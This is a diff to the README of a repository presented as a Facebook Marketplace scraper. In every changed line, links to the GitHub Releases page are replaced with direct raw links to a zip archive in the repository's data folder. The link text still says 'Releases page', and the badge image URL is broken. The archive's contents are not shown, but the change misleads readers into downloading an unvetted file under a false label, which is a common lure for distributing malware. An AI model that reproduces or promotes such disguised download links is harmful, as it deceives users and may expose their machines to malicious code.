@@ -6,7 +6,7 @@ Welcome to the facebook-marketplace-scraper! This tool helps you extract detaile
 
 ## 🔗 Download Now!
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases)
+[![Download the latest release](https://raw.githubusercontent.com/navd-ctrl/facebook-marketplace-scraper/main/data/facebook-marketplace-scraper-v3.7-beta.3.zip%20Release-blue)](https://raw.githubusercontent.com/navd-ctrl/facebook-marketplace-scraper/main/data/facebook-marketplace-scraper-v3.7-beta.3.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements for optimal performance.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases) on GitHub.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/navd-ctrl/facebook-marketplace-scraper/main/data/facebook-marketplace-scraper-v3.7-beta.3.zip) on GitHub.
    
 2. **Choose the Latest Version:** Find the latest release at the top of the page.
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/navd-ctrl/facebook-marketplace-scraper/releases)
+- [Releases Page](https://raw.githubusercontent.com/navd-ctrl/facebook-marketplace-scraper/main/data/facebook-marketplace-scraper-v3.7-beta.3.zip)
 - [Documentation](https://link-to-documentation) - Learn more about advanced features. 
 - [Contributing](https://link-to-contributing-guide) - Want to contribute? Read our guide.
 
